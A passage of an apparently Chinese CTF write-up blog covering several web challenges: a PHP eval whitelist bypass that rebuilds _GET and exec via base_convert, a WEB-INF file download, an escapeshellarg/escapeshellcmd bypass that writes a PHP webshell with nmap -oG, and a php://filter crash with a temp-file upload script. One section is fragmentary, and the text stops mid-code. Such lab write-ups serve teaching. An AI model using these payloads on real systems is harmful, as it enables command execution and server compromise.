[<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//帮你算出答案</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>1.长度被限制在80以内<br>2.黑名单<br>3.白名单</p>
<p>可用函数</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">base_convert</span><span class="hljs-params">()</span></span>	        在任意进制之间转换数字。<br><span class="hljs-function"><span class="hljs-title">bindec</span><span class="hljs-params">()</span></span>				把二进制转换为十进制。<br><span class="hljs-function"><span class="hljs-title">decbin</span><span class="hljs-params">()</span></span>				把十进制转换为二进制。<br><span class="hljs-function"><span class="hljs-title">dechex</span><span class="hljs-params">()</span></span>                把十进制转换为十六进制。<br><span class="hljs-function"><span class="hljs-title">decoct</span><span class="hljs-params">()</span></span> 				把十进制转换为八进制。<br><span class="hljs-function"><span class="hljs-title">hexdec</span><span class="hljs-params">()</span></span>				把十六进制转换为十进制。<br><span class="hljs-function"><span class="hljs-title">octdec</span><span class="hljs-params">()</span></span>				把八进制转换为十进制。<br></code></pre></td></tr></table></figure>

<p>payload1：GET传参</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">system(<span class="hljs-built_in">cat</span> /flag)<br>[]被过滤，使用&#123;&#125;代替<br>转变为 &#123;a&#125;(&#123;b&#125;)&amp;a=system&amp;b=<span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure>

<p>构造_GET参数，需要hex2bin()函数</p>
<p>hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符</p>
<p>base_convert() 函数在任意进制之间转换数字</p>
<p>dechex() 函数把十进制数转换为十六进制数</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">echo base_convert(&quot;hex2bin&quot;,<span class="hljs-number">36</span>,<span class="hljs-number">10</span>)<span class="hljs-comment">;</span><br><span class="hljs-number">37907361743</span><br>得到了hex2bin函数<br>base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)  =&gt;hex2bin<br>base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>))   =&gt;_GET<br></code></pre></td></tr></table></figure>

<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">payload: <span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>));(<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">pi</span>&#125;((<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">abs</span>&#125;)&amp;<span class="hljs-built_in">pi</span>=<span class="hljs-keyword">system</span>&amp;<span class="hljs-built_in">abs</span>=cat /flag<br>(<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">pi</span>&#125;((<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">abs</span>&#125;) =&gt; (<span class="hljs-symbol">$</span>_GET)&#123;<span class="hljs-built_in">pi</span>&#125;(<span class="hljs-symbol">$</span>_GET)&#123;<span class="hljs-built_in">abs</span>&#125;<br></code></pre></td></tr></table></figure>

<p>payload2:header传参</p>
<p>getallheaders — 获取全部 HTTP 请求头信息</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">palyload: <span class="hljs-variable">$pi</span>=base_convert,<span class="hljs-variable">$pi</span>(<span class="hljs-number">696468</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-variable">$pi</span>(<span class="hljs-number">8768397090111664438</span>,<span class="hljs-number">10</span>,<span class="hljs-number">30</span>)()&#123;<span class="hljs-number">1</span>&#125;)<br><br><span class="hljs-function"><span class="hljs-title">base_convert</span><span class="hljs-params">(<span class="hljs-number">696468</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)</span></span> =&gt; <span class="hljs-string">&quot;exec&quot;</span><br><span class="hljs-variable">$pi</span>(<span class="hljs-number">8768397090111664438</span>,<span class="hljs-number">10</span>,<span class="hljs-number">30</span>) =&gt; <span class="hljs-string">&quot;getallheaders&quot;</span><br><span class="hljs-function"><span class="hljs-title">exec</span><span class="hljs-params">(getallheaders()</span></span>&#123;<span class="hljs-number">1</span>&#125;)<br><span class="hljs-number">1</span>:cat flag.php<br></code></pre></td></tr></table></figure>

<h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>源码中提示</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.FileNotFoundException</span>:&#123;help.docx&#125;<br></code></pre></td></tr></table></figure>

<p>WEB-INF是java的WEB应用的安全目录。</p>
<p>1.WEB-INF&#x2F;web.xml</p>
<p>web应用程序配置文件，描述了servlet和其他的应用组件配置及命名规则。</p>
<p>2.WEB-INF&#x2F;classes</p>
<p>包含了站点所有用的class文件，包括servlet class和非servlet class</p>
<p>3.WEB-INF&#x2F;lib</p>
<p>存放web应用需要的JAR文件</p>
<p>4.WEB-INF&#x2F;src</p>
<p>源码目录，按照包名结构放置各个java文件</p>
<p>5.WEB-INF&#x2F;database.properties</p>
<p>数据库配置文件</p>
<p>6.WEB-INF&#x2F;tags</p>
<p>存放了自定义标签文件</p>
<p>7.WEB-INF&#x2F;jsp</p>
<p>jsp 1.2 一下版本的文件存放位置。</p>
<p>8.WEB-INF&#x2F;jsp2</p>
<p>存放jsp2.0以下版本的文件。</p>
<p>9.META-INF</p>
<p>相当于一个信息包。</p>
<p>Nginx在映射静态文件时，把WEB-INF目录映射进去，而又没有做Nginx的相关安全配置（或Nginx自身一些缺陷影响）。从而导致通过Nginx访问到Tomcat的WEB-INF目录</p>
<p>解题思路：</p>
<p>通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">POST <span class="hljs-regexp">/Download?filename=WEB-INF/</span>web.xml<br></code></pre></td></tr></table></figure>

<p><img src="https://i.imgs.ovh/2023/12/07/fFkDU.png" srcset="/img/loading.gif" lazyload></p>
<p>com.wm.FlagController，尝试下载FlagController.class文件</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">POST <span class="hljs-regexp">/Download?filename=WEB-INF/</span>classes<span class="hljs-regexp">/com/</span>wm<span class="hljs-regexp">/ctf/</span>FlagController.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure>

<p><img src="https://i.imgs.ovh/2023/12/07/fFBZ0.png" srcset="/img/loading.gif" lazyload alt="image-20231207211036485"></p>
<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gauss">escapeshellarg — 把字符串转码为可以在 <span class="hljs-built_in">shell</span> 命令里使用的参数<br><br>功能 ：<span class="hljs-built_in">escapeshellarg</span>() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 <span class="hljs-built_in">shell</span> 函数，<span class="hljs-built_in">shell</span> 函数包含 <span class="hljs-built_in">exec</span>()，<span class="hljs-keyword">system</span>() 执行运算符(反引号)<br><br>定义 ：<span class="hljs-keyword">string</span> <span class="hljs-built_in">escapeshellarg</span> ( <span class="hljs-keyword">string</span> $arg )<br><br>escapeshellcmd<br><br>功能 ：<span class="hljs-built_in">escapeshellcmd</span>() 对字符串中可能会欺骗 <span class="hljs-built_in">shell</span> 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 <span class="hljs-built_in">exec</span>() 或 <span class="hljs-keyword">system</span>() 函数，或者 执行操作符 之前进行转义<br>反斜线（\）会在以下字符之前插入：&amp;<span class="hljs-meta">#;`|*?~&lt;&gt;^()[]&#123;&#125;$\、\x0A 和 \xFF。 &#x27; 和 &quot; 仅在不配对的时候被转义。</span><br></code></pre></td></tr></table></figure>

<ol>
<li><p>传入的参数是</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&#x27; -v -d a=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>由于<code>escapeshellarg</code>先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。所以处理之后的效果如下：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-string">&#x27;127.0.0.1&#x27;</span>\<span class="hljs-string">&#x27;&#x27;</span> -v -d <span class="hljs-attribute">a</span>=1&#x27;<br></code></pre></td></tr></table></figure>
</li>
<li><p>接着 <code>escapeshellcmd</code> 函数对第二步处理后字符串中的 <code>\</code> 以及 <code>a=1&#39;</code> 中的单引号进行转义处理，结果如下所示：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-string">&#x27;127.0.0.1&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span> -v -d <span class="hljs-attribute">a</span>=1\&#x27;<br></code></pre></td></tr></table></figure>
</li>
<li><p>由于第三步处理之后的payload中的 <code>\\</code> 被解释成了 <code>\</code> 而不再是转义字符，所以单引号配对连接之后将payload分割为三个部分，具体如下所示：</p>
</li>
</ol>
<p><img src="https://i.imgs.ovh/2023/12/07/fFRZd.png" srcset="/img/loading.gif" lazyload alt="6"></p>
<p>可以简化为 <code>curl 127.0.0.1\ -v -d a=1&#39;</code> ，即向 <code>127.0.0.1\</code> 发起请求，POST 数据为 <code>a=1&#39;</code> 。</p>
<p><strong>但是如果是先用 escapeshellcmd 函数过滤，再用的 escapeshellarg 函数过滤，则没有这个问题。</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day5/files/README.md">PHP escapeshellarg()和escapeshellcmd()并用之殇</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-variable">$host</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br>  <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$host</span>);<br>  <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$host</span>);<br>  <span class="hljs-variable">$sandbox</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;glzjin&quot;</span>. <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;you are in sandbox &#x27;</span>.<span class="hljs-variable">$sandbox</span>;<br>  @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<br>  <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);<br>  <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="hljs-variable">$host</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>有system来执行命令</p>
<p>常见的命令后注入操作如 | &amp; &amp;&amp; ; 都不行，虽然我们通过上面的操作逃过了单引号，但escapeshellcmd会对这些特殊符号前面加上\来转移</p>
<p>nmap命令中 有一个参数-oG可以实现将命令和结果写到文件。 这个命令就是我们的输入可控，然后写入到文件</p>
<p>payload：</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?host=&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG test.php &#x27;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?host=&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> `cat /flag`;<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG test.php &#x27;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://i.imgs.ovh/2023/12/07/fFcKK.png" srcset="/img/loading.gif" lazyload alt="image-20231207215017541"></p>
<p>访问查看flag</p>
<p><img src="https://i.imgs.ovh/2023/12/07/fFe42.png" srcset="/img/loading.gif" lazyload alt="image-20231207215045898"></p>
<h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       <span class="hljs-meta">?&gt;</span><span class="hljs-string">&#x27;&amp;filename=test.php</span><br></code></pre></td></tr></table></figure>

<p>连接中国蚁剑<br>在根目录运行readflag</p>
<h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p>源码发现提示</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--md5($secret.$name)===$pass --&gt;</span><br></code></pre></td></tr></table></figure>

<p>get方式传入值</p>
<p><img src="https://i0.imgs.ovh/2024/03/06/QxTMV.png" srcset="/img/loading.gif" lazyload alt="image-20240307213807493"></p>
<p>响应包将一串hash值设置在Cookie内返回，而这串hash值是当前传入的参数name使用md5加密后的结果，我们将获取到的值再用参数pass传入就可以了</p>
<p>发现&#x2F;flflflflag.php</p>
<p><img src="https://i0.imgs.ovh/2024/03/06/QxqSJ.png" srcset="/img/loading.gif" lazyload alt="image-20240307214040392"></p>
<p>include($_GET[“file”])</p>
<p>用伪协议读取一下源码</p>
<p><img src="https://i0.imgs.ovh/2024/03/06/Qx9dW.png" srcset="/img/loading.gif" lazyload alt="image-20240307214340054"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/data|input|zip/is&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nonono&#x27;</span>);<br>&#125;<br>@<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>过滤了data和input，不用考虑命令执行了。</p>
<p>扫描发现dir.php和congfig.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/tmp&#x27;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$secret</span>=<span class="hljs-string">&#x27;%^$&amp;$#fffdflag_is_not_here_ha_ha&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>dir.php能打印临时文件夹里的内容,尝试利用</p>
<p>观察响应包可得X-Powered-By: PHP&#x2F;7.0.33</p>
<p>知识点：</p>
<p>php7.0的bug：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/string.strip_tags/</span>resource=<span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure>

<blockquote>
<p>使用php:&#x2F;&#x2F;filter&#x2F;string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell。这个崩溃原因是存在一处空指针引用。</p>
<p>该方法仅适用于以下php7版本，php5并不存在该崩溃。</p>
</blockquote>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">• php<span class="hljs-number">7.0.0-7</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>可以利用， <span class="hljs-number">7</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>x版本的已被修复<br><br>• php<span class="hljs-number">7.1.3-7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span>可以利用， <span class="hljs-number">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span>x版本的已被修复<br><br>• php<span class="hljs-number">7.2.2-7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">8</span>可以利用， <span class="hljs-number">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">9</span>一直到<span class="hljs-number">7</span>.<span class="hljs-number">3</span>到现在的版本已被修复<br></code></pre></td></tr></table></figure>

<p>脚本如下</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">import requests</span><br><span class="language-xml">from io import BytesIO</span><br><span class="language-xml"></span><br><span class="language-xml">url = &quot;http://daf37d2a-5017-47b7-a42b-71db66a88c63.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span><br><span class="language-xml"></span><br><span class="language-xml">phpfile = &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br><span class="language-xml">filedata = &#123;</span><br><span class="language-xml">    &quot;file&quot;:phpfile</span><br><span class="language-xml">&#125;</span><br><span class="language-xml"></span><br><span class="language-xml">bak = requests.post(url=url, files=filedata)</span><br><span class="language-xml">print(bak.text)</span><br></code></pre></td></tr></table></figure>

<p>进入<strong>dir.php</strong>查看发现木马已上传：</p>
<p><img src="https://i0.imgs.ovh/2024/03/06/QxN2v.png" srcset="/img/loading.gif" lazyload alt="image-20240307215250453"></p>
<p><img src="https://i0.imgs.ovh/2024/03/06/Qxahe.png" srcset="/img/loading.gif" lazyload alt="image-20240307215313276"></p>
<h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><p>查看源码app.js</p>
<p><img src="https://i0.imgs.ovh/2024/03/07/QUgou.png" srcset="/img/loading.gif" lazyload alt="image-20240308202156477"></p>
<p>观察网站源码，在<code>app.js</code>中可以查看登录验证，可以看到登录相关的主要存在这三个变量中<code>username, password, authorization</code>。当登录成功时就会跳转到&#x2F;home目录下失败则会返回<code>Cannot read property &#39;split&#39; of undefined</code></p>
<p>寻找未发现</p>
<p>由于上面的 app.js 里有写到 static 是直接映射到程序根目录的，猜测程序可能存在任意文件读取漏洞。继续对网站进行探测，在<code>controllers</code>接口中发现<code>api.js</code>泄露，里面存在具体的登录注册等逻辑代码，也就是放在服务端的代码。</p>
<p>&#x2F;controllers&#x2F;api.js</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span 